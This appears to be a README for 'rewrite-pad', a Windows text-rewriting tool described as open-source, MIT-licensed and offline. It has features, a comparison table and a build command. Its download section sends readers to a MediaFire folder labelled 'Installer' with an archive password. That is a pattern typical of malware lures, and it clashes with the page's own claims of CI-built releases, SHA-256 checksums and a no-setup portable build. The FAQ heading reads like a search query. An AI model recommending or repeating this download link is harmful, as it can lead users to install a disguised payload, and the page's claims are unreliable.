# rewrite-pad

✏️ Free, open-source text rewriting workbench for Windows — shorten, formalize, simplify with a local LLM. 100 MB portable, offline, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Action buttons** — shorten, formalize, simplify, expand and fix grammar run against any local llama.cpp server
- ✅ **Diff review** — changes shown as inline diffs; accept per hunk instead of trusting a full overwrite
- ✅ **Tone presets** — professional, friendly and plain-English modes saved with their own instructions
- ✅ **Clipboard round trip** — hotkey takes the selection, rewrites it and puts the result back
- ✅ **Style memory** — a short rules box reminds the model of your conventions every run
- ✅ **Project history** — every rewrite kept with before and after, searchable
- ✅ **100 MB self-contained exe** — runtime bundled, model runs locally, offline, MIT with SHA-256 releases

## Why rewrite-pad

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **rewrite-pad** | Grammarly | ChatGPT web | LanguageTool |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Paid premium | Free tier | Free tiers |
| Open source | **Yes** | No | No | Partial
| Text stays local | **Yes** | Upload | Upload | Partial
| Arbitrary rewrite actions | **Yes** | Limited | Chatty | No
| Per-hunk diff accept | **Yes** | No | No | Partial
| Portable, no install | **Yes, 100 MB** | Extension | Browser | Extension

## FAQ

**offline paraphrasing tool for Windows that does not upload my text?**

Web paraphrasers upload whatever you paste and gate the good modes behind a subscription. rewrite-pad talks to a local LLM server, shows rewrites as reviewable diffs and keeps every draft in local history. It is a 100 MB portable exe, MIT, and works with the network unplugged.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark pad (#121418, blue #3B82F6): original text left pane, rewritten right pane with green and red inline diffs, accept all and keep original buttons beneath.
2. Tone shelf: five preset cards with descriptions, custom rules box expanded showing terminology list, model connection chip reading localhost ready.
3. History list: twenty rewrites with timestamps and reading-time deltas, search field, reopen in compare action on the hovered row.

## Download

| Source | Link |
|---|---|
| 💾 **Installer rewrite-pad** | [Installer rewrite-pad](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).